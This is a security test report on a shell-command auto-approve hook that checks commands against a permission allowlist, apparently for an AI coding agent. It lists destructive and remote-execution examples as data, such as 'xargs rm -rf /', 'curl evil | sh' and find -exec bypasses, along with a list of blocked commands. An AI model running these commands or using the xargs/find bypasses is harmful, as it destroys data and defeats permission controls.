# Hook Security Report

This report summarizes findings from comprehensive testing of the auto-approve hook system (`assets/auto-approve-allowed-commands.sh`). The hook parses shell commands using `shfmt` and validates them against a permission allowlist.

**Test Date:** December 2024
**Total Tests:** 445
**Passing:** 445
**Skipped:** 0

---

## Executive Summary

The hook correctly handles shell command patterns including nested command substitutions, process substitutions, and loop iterators. All previously identified security gaps have been fixed.

**Risk Level:** Low - the parser extracts and validates commands from all dangerous constructs

---

## Fixed Security Issues

### 1. Command Substitution in Double Quotes ✅ FIXED

Commands inside `$()` within double-quoted strings are now correctly extracted.

```bash
# With only Bash(echo:*) permission, this is now BLOCKED:
echo "Today is $(whoami)"
# Parser extracts: echo, whoami - both must be permitted
```

---

### 2. Process Substitution ✅ FIXED

Commands inside `<()` and `>()` process substitutions are now extracted.

```bash
# With only Bash(diff:*) permission, this is now BLOCKED:
diff <(cat file1) <(cat file2)
# Parser extracts: diff, cat file1, cat file2 - all must be permitted
```

---

### 3. For Loop Iterator Substitution ✅ FIXED

Command substitution in for loop iterators is now extracted.

```bash
# With only Bash(echo:*) permission, this is now BLOCKED:
for f in $(ls); do echo "$f"; done
# Parser extracts: ls, echo - both must be permitted
```

---

### 4. Dangerous Wildcard Permissions (BY DESIGN - DOCUMENT)

**Issue:** Certain permissions are inherently dangerous because they allow arbitrary command execution.

```bash
# Bash(xargs:*) allows ANY command:
cat files.txt | xargs rm -rf /
cat files.txt | xargs bash -c "curl evil | sh"

# Bash(find:*) allows ANY command via -exec:
find . -exec rm -rf {} \;
find . -exec bash -c "dangerous" \;
```

**Current status:** Tests pass and document this behavior

**Recommendation:**
1. Add documentation warning about dangerous permissions
2. Consider a "dangerous permissions" list that triggers extra warnings
3. Potentially require more specific permissions like `Bash(xargs echo:*)` or `Bash(find . -name:*)`

---

## Behavioral Notes (Not Security Issues)

These are parser behaviors that differ from expectations but don't pose security risks:

### Commands Not Extracted

| Pattern | Behavior | Security Impact |
|---------|----------|-----------------|
| Function definitions | Not extracted | None (definitions don't execute) |
| Variable assignments (`export`, `declare`, `local`) | Not extracted | Low (assignments are generally safe) |
| `[[ ]]` test constructs | Not extracted | None (test conditions don't execute commands) |
| Arithmetic `$(( ))` | Stripped from output | None (arithmetic, not commands) |

### Parser Normalizations

| Input | Output | Notes |
|-------|--------|-------|
| `` `cmd` `` | `$(cmd)` | Backticks converted to `$()` |
| `${VAR}` | `$VAR` | Braces removed |
| `${arr[0]}` | `$arr` | Array index simplified |
| `${VAR:-default}` | `$VAR` | Default value stripped |

### Unwrapping Support

| Pattern | Unwrapped? | Notes |
|---------|------------|-------|
| `bash -c 'cmd'` | ✅ Yes | Correctly extracts inner command |
| `sh -c 'cmd'` | ✅ Yes | Correctly extracts inner command |
| `/bin/bash -c 'cmd'` | ✅ Yes | Absolute path now supported |
| `env bash -c 'cmd'` | ✅ Yes | env prefix now supported |

---

## Test Coverage Summary

### By Category

| Category | Tests | Status |
|----------|-------|--------|
| Pipes and pipelines | 15 | ✅ All pass |
| Chaining (&&, \|\|, ;) | 20 | ✅ All pass |
| Comments | 12 | ✅ All pass |
| Multi-line commands | 6 | ✅ All pass |
| Colons in commands | 12 | ✅ All pass |
| Quoted strings | 26 | ✅ All pass |
| String content safety | 26 | ✅ All pass |
| Subshells | 10 | ✅ All pass |
| Loops and conditionals | 21 | ✅ All pass |
| bash -c unwrapping | 23 | ✅ All pass |
| Environment variables | 15 | ✅ All pass |
| Redirections | 15 | ✅ All pass |
| Builtins | 24 | ✅ All pass |
| Functions | 3 | ✅ All pass |
| Paths | 21 | ✅ All pass |
| xargs/find | 34 | ✅ All pass |
| Permission matching | 29 | ✅ All pass |
| Real-world commands | 58 | ✅ All pass |
| Security (dangerous cmds) | 27 | ✅ All pass |
| Edge cases | 48 | ✅ All pass |

### Security Tests Passing

The hook correctly blocks:
- Direct dangerous commands (`rm`, `mv`, `chmod`, `chown`, `sudo`)
- Dangerous commands in pipes (`ls | rm`)
- Dangerous commands in chains (`ls && rm file`)
- Remote code execution patterns (`curl | bash`, `wget | sh`)
- Command substitution with dangerous commands (`echo $(rm file)`)
- Backtick substitution with dangerous commands (`` echo `rm file` ``)
- bash -c with dangerous commands (`bash -c 'rm file'`)

---

## Recommendations

### Completed ✅

1. ~~**Extract process substitution commands** for validation~~ - DONE
2. ~~**Handle double-quoted command substitution** properly~~ - DONE
3. ~~**Extract for loop iterator command substitutions**~~ - DONE

### Remaining Improvements

1. **Add warnings** for dangerous permissions (`xargs:*`, `find:*`)

### Long-term Considerations

1. **Permission granularity** - Allow more specific permissions like:
   - `Bash(xargs ls:*)` instead of `Bash(xargs:*)`
   - `Bash(find . -name:*)` instead of `Bash(find:*)`
2. **Dangerous permission warnings** - Prompt users when adding risky permissions
3. **Audit logging** - Log all auto-approved commands for review

---

## Discussion Questions (Resolved)

1. **Process substitution:** ✅ Resolved - We extract nested commands for validation.

2. **Double-quoted `$()`:** ✅ Resolved - We extract and validate these commands.

3. **Dangerous permissions:** Open - Should we maintain a list and show warnings, or trust users to understand the implications?

4. **Absolute paths:** ✅ Resolved - `/bin/bash -c` and `env bash -c` now properly unwrapped

5. **Permission granularity:** Open - Is the current prefix-matching system sufficient, or do we need more sophisticated patterns?

---

## Files Reference

- **Hook script:** `assets/auto-approve-allowed-commands.sh`
- **Test helper:** `test/hook/hook_test_helper.bash`
- **Test files:** `test/hook/*.bats`
- **Test cases doc:** `HOOK_TEST_CASES.md`
